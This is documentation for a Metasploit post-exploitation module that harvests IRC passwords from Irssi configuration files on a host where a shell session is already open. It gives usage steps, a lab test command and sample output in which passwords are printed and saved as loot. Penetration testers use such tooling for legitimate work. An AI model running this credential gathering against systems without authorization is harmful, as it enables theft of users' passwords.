## Vulnerable Application

[irssi](https://irssi.org/) an IRC and chat client.

This module was successfully tested against:

- OSX 10.10.5 and IRSSI version 0.8.19
- Linux/amd64 with Ubuntu 22.04, Irssi 1.2.3 and ngIRCd 26.1

### Automated Linux target

The [container target guide](../../../../../test/module_targets/irssi_creds/README.md)
provides a pinned Irssi/ngIRCd lab and automated verification. From the Framework
repository root, run:

```sh
bundle exec ruby tools/dev/run_guarded_module_target_tests.rb irssi_creds
```

Real Irssi terminal sessions and IRC rawlogs independently verify the configured
server password before the post module collects the exact raw configuration.
The profile also covers formatting, repeat and file-access boundaries. It runs
two capped containers and a host Framework console, then removes its owned
containers, database volume and networks.

Collected configuration can contain potentially sensitive commented or invalid
passwords. Raw loot does not establish that a credential authenticates. The
automated target does not supply NickServ services or qualify NickServ login.
Other platforms, releases and configuration syntax remain separate tests.

## Verification Steps

  1. Get a supported `shell` session on some host.
  2. Do: `use post/multi/gather/irssi_creds`
  3. Do: `set SESSION [SESSION_ID]`
  4. Do: `run`
  5. If the system has readable configuration files containing irc passwords, they will be printed out.

## Options

No specific options

## Scenarios

### OSX 10.10.5 and IRSSI version 0.8.19

```
msf post(irssi_creds) > run

msf post(irssi_creds) > run

[*] Finding ~/.irssi/config
[*] Looting 1 files
[+] Found a IRC password(s): chubbybunnies,meatpopcicle
[+] IRC password(s) stored in /Users/jclaudius/.msf4/loot/20170410153351_default_192.168.10.99_irc.password_159907.txt
[+] IRC password(s) stored in /Users/jclaudius/.msf4/loot/20170410153351_default_192.168.10.99_irc.password_967698.txt
[*] Post module execution completed
```
